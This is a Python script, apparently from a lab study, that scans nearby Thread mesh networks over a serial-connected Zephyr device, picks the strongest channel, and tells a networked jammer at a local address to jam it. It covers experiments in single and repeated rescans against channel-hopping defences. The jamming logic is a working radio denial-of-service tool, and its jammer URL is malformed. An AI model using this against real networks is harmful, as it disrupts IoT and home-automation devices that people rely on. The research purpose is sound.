import serial
import serial.serialutil
import serial.tools.list_ports as ports_list
import re
import os
import sys
import glob
import time
import requests

SUB_STRINGS =  ["\x1b[1;32muart:~$", "\x1b[m\x1b[8D\x1b[J'", "\x1b[m']"]

channel = '15' # Default value

IPV4_ADDR = "10.10.10.2"
INJECT_URL = f"http://{IPV4_ADDR}/inject.cgi"

DEBUG = False

class ot_device:
    def __init__(self, port):
        self.port = port  # COM Port
        self.serial = serial.Serial(self.port, 115200, timeout=0.1, write_timeout=1.0)

    def reset_buffer(self):
        self.serial.write(bytes("\r\n", "utf-8"))
        self.serial.read(1000)
        self.serial.reset_input_buffer()
        self.serial.reset_output_buffer()

    # Run command and return formatted output
    def run_command(self, command):
        self.reset_buffer()
        self.serial.write(bytes(command + "\r\n", "utf-8"))
        if DEBUG:
            print("\n" + command)
        return self.get_output()

    # Get output and format lines
    def get_output(self):
        self.serial.readline()
        res = self.serial.read(10000)
        if DEBUG:
            print(res.decode())
        return res.decode()
    
    def scan_network(self):
        self.reset_buffer()
        self.serial.write(b"ot scan\r\n")
        headers = self.get_output() # First output is the headers
        time.sleep(4.8)
        res = self.serial.read_all().decode()
        return res
        
        
# Get available COM ports
def get_ports():
    ports_l = []
    if sys.platform.startswith("win"):
        ports = list(ports_list.comports())
        for port in ports:
            ports_l.append(port.name)
    elif sys.platform.startswith("linux") or sys.platform.startswith("cygwin"):
        ports_l = glob.glob("/dev/ttyACM*")
    else:
        print("No available ports found")
    if len(ports_l):
        print("\n" + str(len(ports_l)) + " serial connections found")
        if DEBUG:
            print(ports_l)
    return ports_l

def link_device(available_ports):
    print("Finding thread devices...")
    for port in available_ports:
        try:
            device = ot_device(port)
            platform = device.run_command("\r\not platform")
            if "Zephyr" in platform:
                return device
        except serial.serialutil.SerialTimeoutException:
            pass # ignore devices that timeout

def get_open_networks(thread_device):
    scan = thread_device.scan_network()
    networks = []
    for entry in scan.split('\n')[:-2]:
        entry = list(filter(None, ''.join(letter for letter in ''.join(entry.split('|')) if letter.isalnum()).replace('8DJ', '').replace('132muartm', ' ').split(' ')))
        network = {
            "pan": entry[0],
            "mac_addr": ''.join(entry[1:8]),
            "ch": entry[9],
            "dbm": int(entry[10]) * -1,
            "lqi": int(entry[11])
        }
        networks.append(network)
    return networks

def choose_channel(networks):
    strongest_channel = [networks[0]['ch'], networks[0]['dbm']]
    for network in networks:
        if network['dbm'] > strongest_channel[1]:
            strongest_channel = [network['ch'], network['dbm']]
    return strongest_channel[0]
        
def attack_channel(channel):
    r = requests.get(f"https://{IPV4_ADDR}.test.cgi?chn={channel}&mode=1&modul=0&txlevel=0")

"""
This function covers the first two experiments:
Experiment 1: Jamming Thread Network on single radio Channel with no Countermeasure
Experiment 2: Jamming Thread Network on single radio Channel with Simple Countermeasure - one channel hop, jammer doesn't rescan
"""
def single_scan_jamming():
    ports = get_ports()
    thread_device = link_device(ports)
    networks = get_open_networks(thread_device)
    channel = choose_channel(networks)
    attack_channel(channel)

"""
This function covers the second two experiments:
Experiment 3: Jamming Thread Network on single radio Channel with more complex Countermeasure deployed - continuous channel hopping capability, with attacker able to rescan.
Experiment 4: Jamming Thread Network on single radio Channel with complex Countermeasure deployed - channel hopping and duplication, with attacker able to rescan (but still only able to jam one channel at a time).
"""
def multiple_scan_jamming():
    while True:
        ports = get_ports()
        thread_device = link_device(ports)
        networks = get_open_networks(thread_device)
        channel = choose_channel(networks)
        attack_channel(channel)
        
single_scan_jamming()